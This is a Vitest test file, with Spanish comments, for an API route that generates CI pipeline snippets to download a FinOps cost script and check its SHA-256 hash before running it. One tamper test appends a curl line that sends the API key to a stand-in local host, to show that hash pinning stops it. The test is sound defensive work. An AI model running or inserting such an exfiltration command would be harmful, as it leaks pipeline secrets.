// @vitest-environment node
import { describe, it, expect, vi, beforeEach, beforeAll, afterAll } from "vitest";
import { createHash } from "node:crypto";
import { createRequire } from "node:module";
import { createServer, type Server } from "node:http";
import { execFile } from "node:child_process";
import { chmodSync, mkdtempSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { NextRequest } from "next/server";
import { HERRAMIENTAS, RUTA_SCRIPT, sha256DelScript, snippets, type Herramienta } from "@/lib/shiftLeftSetup";

const requireTenantAccess = vi.fn();
const requireTenantTier = vi.fn();
const { AuthErrorMock } = vi.hoisted(() => ({
    AuthErrorMock: class AuthErrorMock extends Error {
        status: number;
        constructor(message: string, status = 403) { super(message); this.status = status; }
    },
}));
vi.mock("@/lib/requestAuth", () => ({
    AuthError: AuthErrorMock,
    requireTenantAccess: (...a: unknown[]) => requireTenantAccess(...a),
    requireTenantTier: (...a: unknown[]) => requireTenantTier(...a),
}));

import { GET } from "@/app/api/governance/shift-left/setup/route";

// js-yaml viene con eslint: está siempre que se instalan las dependencias de desarrollo.
const yaml = createRequire(import.meta.url)("js-yaml") as { load: (s: string) => any };

const SCRIPT = join(process.cwd(), "public/integrations/shift-left/finops-estimate.sh");
const APIURL = "https://finops.ejemplo.com";
const SHA = sha256DelScript();
const todos = (tool: Herramienta) => snippets({ apiUrl: APIURL, sha256: SHA, tool });

describe("el hash del script", () => {
    it("es el SHA-256 real del archivo que se sirve", () => {
        expect(SHA).toMatch(/^[0-9a-f]{64}$/);
        expect(SHA).toBe(createHash("sha256").update(readFileSync(SCRIPT)).digest("hex"));
    });
});

describe("los snippets", () => {
    for (const tool of HERRAMIENTAS) {
        describe(tool, () => {
            const s = todos(tool);

            it("son YAML válido en las tres plataformas", () => {
                for (const [plataforma, texto] of Object.entries(s)) {
                    expect(() => yaml.load(texto), plataforma).not.toThrow();
                    expect(yaml.load(texto), plataforma).toBeTruthy();
                }
            });

            it("descargan el script de la plataforma y fijan su hash, en las tres", () => {
                for (const texto of Object.values(s)) {
                    expect(texto).toContain(`${APIURL}${RUTA_SCRIPT}`);
                    expect(texto).toContain(`${SHA}  finops-estimate.sh`);
                    expect(texto).toContain("sha256sum -c -");
                    // El hash se verifica ANTES de ejecutar: el orden importa.
                    expect(texto.indexOf("sha256sum -c -")).toBeLessThan(texto.indexOf("bash finops-estimate.sh"));
                }
            });

            it("la clave nunca va escrita: sale de un secreto", () => {
                expect(s.github).toContain("${{ secrets.FINOPS_API_KEY }}");
                expect(s.azuredevops).toContain("$(FINOPS_API_KEY)");
                expect(s.gitlab).toContain("FINOPS_API_KEY");
                expect(s.gitlab).not.toMatch(/FINOPS_API_KEY:\s*\S/); // variable de CI/CD enmascarada, no literal
                for (const texto of Object.values(s)) expect(texto).not.toMatch(/pak_(live|test)_/);
            });

            it("pasan el contexto del PR que el script necesita", () => {
                expect(s.github).toContain("FINOPS_PR_NUMBER: ${{ github.event.pull_request.number }}");
                expect(s.github).toContain("GITHUB_TOKEN: ${{ github.token }}");
                expect(s.azuredevops).toContain("FINOPS_PR_NUMBER: $(System.PullRequest.PullRequestId)");
                expect(s.azuredevops).toContain("SYSTEM_ACCESSTOKEN: $(System.AccessToken)");
                expect(s.gitlab).toContain("FINOPS_PR_NUMBER: $CI_MERGE_REQUEST_IID");
            });
        });
    }

    it("GitHub necesita permiso para comentar", () => {
        const wf = yaml.load(todos("terraform").github);
        expect(wf.permissions["pull-requests"]).toBe("write");
        expect(wf.on).toHaveProperty("pull_request");
    });

    it("Azure DevOps avisa que el disparador de un PR en Azure Repos es una política de rama", () => {
        expect(todos("terraform").azuredevops).toContain("política de rama");
    });

    it("cada herramienta genera el plan a su manera", () => {
        expect(todos("terraform").github).toContain("terraform plan -input=false -out=tfplan.bin");
        expect(todos("terraform").github).toContain("hashicorp/setup-terraform@v3");
        expect(todos("tofu").github).toContain("tofu plan -input=false -out=tfplan.bin");
        expect(todos("tofu").github).toContain("FINOPS_TOOL: tofu");
        expect(todos("bicep").github).toContain("az deployment group what-if");
        expect(todos("bicep").github).toContain("--no-pretty-print");
        expect(todos("bicep").github).toContain("FINOPS_TOOL: bicep");
        expect(todos("bicep").github).toContain("FINOPS_PLAN_JSON: whatif.json");
        expect(todos("terraform").github).not.toContain("FINOPS_TOOL");
    });

    it("GitLab separa el plan del estimador y le pasa el archivo como artefacto", () => {
        const y = yaml.load(todos("terraform").gitlab);
        expect(y["generar-plan"].artifacts.paths).toEqual(["plan.json"]);
        expect(y["finops-shift-left"].needs).toEqual(["generar-plan"]);
        expect(y["finops-shift-left"].variables.FINOPS_PLAN_JSON).toBe("plan.json");
        expect(yaml.load(todos("bicep").gitlab)["finops-shift-left"].variables.FINOPS_PLAN_JSON).toBe("whatif.json");
    });
});

describe("el snippet de GitHub corre de punta a punta", () => {
    let servidor: Server;
    let puerto = 0;
    let servirScript = readFileSync(SCRIPT);
    const llamadas: string[] = [];
    let dir = "";

    beforeAll(async () => {
        servidor = createServer((req, res) => {
            const url = String(req.url);
            llamadas.push(`${req.method} ${url}`);
            if (url === RUTA_SCRIPT) { res.writeHead(200); res.end(servirScript); return; }
            req.resume();
            req.on("end", () => {
                res.writeHead(200, { "Content-Type": "application/json" });
                res.end(JSON.stringify({ data: {
                    current_monthly_cost_usd: 0, projected_monthly_cost_usd: 70.08, delta_cost_usd: 70.08, list_delta_cost_usd: 70.08,
                    discount_pct: 0, resources_unpriced: 0, resources_by_use: 0, resources_free: 0,
                    budget_gate: { status: "NOT_EVALUATED", threshold_usd: null, threshold_pct_of_remaining: null, reason: null },
                    budget: null, previous: null, lines: [],
                } }));
            });
        });
        await new Promise<void>((r) => servidor.listen(0, "127.0.0.1", r));
        puerto = (servidor.address() as any).port;
    });
    afterAll(() => new Promise<void>((r) => servidor.close(() => r())));
    beforeEach(() => { llamadas.length = 0; servirScript = readFileSync(SCRIPT); dir = mkdtempSync(join(tmpdir(), "finops-snip-")); });

    /** `sha256sum` es de GNU: los runners de CI lo tienen, macOS no. Se lo da una función de shasum. */
    function prepararBin(): string {
        const bin = join(dir, "bin");
        mkdirSync(bin);
        const f = join(bin, "sha256sum");
        writeFileSync(f, '#!/bin/sh\nexec shasum -a 256 "$@"\n');
        chmodSync(f, 0o755);
        return bin;
    }

    function ejecutar(): Promise<{ codigo: number; stderr: string }> {
        const apiUrl = `http://127.0.0.1:${puerto}`;
        const wf = yaml.load(snippets({ apiUrl, sha256: sha256DelScript(), tool: "terraform" }).github);
        const paso = wf.jobs.costo.steps.find((p: any) => /Estimar el costo/.test(p.name));
        writeFileSync(join(dir, "plan.json"), readFileSync("__tests__/fixtures/terraform-plan-azurerm-completo.json"));
        // Lo que GitHub inyecta con ${{ }}: se reemplaza por valores de prueba.
        const env: Record<string, string> = {};
        for (const [k, v] of Object.entries<string>(paso.env)) {
            env[k] = v.replace("${{ secrets.FINOPS_API_KEY }}", "pak_test_1").replace("${{ github.token }}", "")
                .replace(/\$\{\{[^}]+\}\}/, k === "FINOPS_PR_NUMBER" ? "" : "x");
        }
        env.FINOPS_PLAN_JSON = join(dir, "plan.json");
        return new Promise((resolve) => {
            execFile("bash", ["-eo", "pipefail", "-c", paso.run], {
                cwd: dir,
                env: { PATH: `${prepararBin()}:${process.env.PATH}`, HOME: process.env.HOME ?? "", ...env, FINOPS_RETRY_DELAY: "0" },
                timeout: 60_000,
            }, (err, _out, stderr) => resolve({ codigo: err ? (typeof (err as any).code === "number" ? (err as any).code : 1) : 0, stderr }));
        });
    }

    it("descarga el script, verifica el hash, lo ejecuta y llama a la API", async () => {
        const r = await ejecutar();
        expect(r.codigo).toBe(0);
        expect(llamadas).toContain(`GET ${RUTA_SCRIPT}`);
        expect(llamadas.some((l) => l.startsWith("POST /api/v1/shift-left/estimate"))).toBe(true);
    });

    it("si el script fue adulterado, el hash no coincide y NO se ejecuta nada", async () => {
        // Es lo que justifica fijar el hash: lo que se descarga no es lo que se publicó.
        servirScript = Buffer.from(readFileSync(SCRIPT, "utf8") + '\ncurl -s http://127.0.0.1:1/robo?k="$FINOPS_API_KEY"\n');
        const r = await ejecutar();
        expect(r.codigo).not.toBe(0);
        expect(llamadas.some((l) => l.startsWith("POST /api/v1/shift-left/estimate"))).toBe(false);
    });
});

describe("GET /api/governance/shift-left/setup", () => {
    const get = (qs: string) => new NextRequest(`https://finops.ejemplo.com/api/governance/shift-left/setup?${qs}`);

    beforeEach(() => {
        requireTenantAccess.mockReset().mockResolvedValue({});
        requireTenantTier.mockReset().mockResolvedValue({});
    });

    it("devuelve los tres snippets con la URL pública y el hash del script", async () => {
        const j = await (await GET(get("tenantId=t1"))).json();
        expect(j.sha256).toBe(sha256DelScript());
        expect(j.scriptUrl).toBe(`${j.apiUrl}${RUTA_SCRIPT}`);
        expect(Object.keys(j.snippets).sort()).toEqual(["azuredevops", "github", "gitlab"]);
        expect(j.snippets.github).toContain(j.sha256);
        expect(requireTenantTier.mock.calls[0][2]).toBe("Enterprise");
    });

    it("elige la herramienta", async () => {
        const j = await (await GET(get("tenantId=t1&tool=bicep"))).json();
        expect(j.tool).toBe("bicep");
        expect(j.snippets.github).toContain("what-if");
    });

    it("rechaza una herramienta desconocida y la falta de tenant", async () => {
        expect((await GET(get("tenantId=t1&tool=pulumi"))).status).toBe(400);
        expect((await GET(get("tool=terraform"))).status).toBe(400);
    });

    it("exige acceso y tier, salvo para la demo", async () => {
        requireTenantTier.mockRejectedValue(new AuthErrorMock("plan", 403));
        expect((await GET(get("tenantId=t1"))).status).toBe(403);
        requireTenantTier.mockClear(); requireTenantAccess.mockClear();
        expect((await GET(get("tenantId=demo"))).status).toBe(200);
        expect(requireTenantAccess).not.toHaveBeenCalled();
    });
});
